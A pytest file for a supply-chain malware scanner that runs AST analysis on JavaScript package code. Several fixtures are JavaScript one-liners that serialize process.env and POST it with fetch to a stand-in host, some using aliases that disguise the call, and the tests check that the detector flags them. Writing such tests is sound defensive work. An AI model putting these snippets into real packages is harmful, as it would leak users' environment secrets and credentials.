from __future__ import annotations

import json

import pytest

from ast_candidate import analyze_candidate
from supply_chain_sentinel.models import Artifact


def _artifact(source: str) -> Artifact:
    return Artifact(
        "synthetic",
        "1.0.0",
        "",
        {
            "package.json": json.dumps({"name": "synthetic", "version": "1.0.0"}).encode(),
            "index.js": source.encode(),
        },
        "synthetic",
    )


def test_tracks_computed_environment_and_network_alias() -> None:
    source = (
        "const e=process['env']; const f=globalThis['fetch']; "
        "f('https://collector.invalid',{body:JSON.stringify(e)});"
    )
    findings = analyze_candidate(_artifact(source))
    assert [finding.rule_id for finding in findings] == ["ast-sensitive-egress"]


def test_tracks_intermediate_payload_alias() -> None:
    source = (
        "const secrets=process.env; const body=JSON.stringify(secrets); "
        "fetch('https://collector.invalid',{method:'POST',body});"
    )
    assert analyze_candidate(_artifact(source))


def test_tracks_environment_nested_in_serialization_call() -> None:
    source = "fetch('https://collector.invalid',{body:JSON.stringify(process.env)});"
    assert analyze_candidate(_artifact(source))


def test_does_not_flag_local_environment_or_unrelated_request() -> None:
    source = "const port=process.env.PORT; fetch('https://example.com/health');"
    assert not analyze_candidate(_artifact(source))


def test_does_not_flag_logging_sensitive_data_without_network() -> None:
    source = "console.log(JSON.stringify(process.env));"
    assert not analyze_candidate(_artifact(source))


def test_ignores_comments_and_strings() -> None:
    source = (
        "// const e=process.env; fetch(url,{body:e});\n"
        "const note='process.env'; fetch('https://example.com');"
    )
    assert not analyze_candidate(_artifact(source))


def test_rejects_unparseable_javascript_instead_of_reporting_clean() -> None:
    with pytest.raises(ValueError, match="JavaScript parse error"):
        analyze_candidate(_artifact("const = process.env;"))
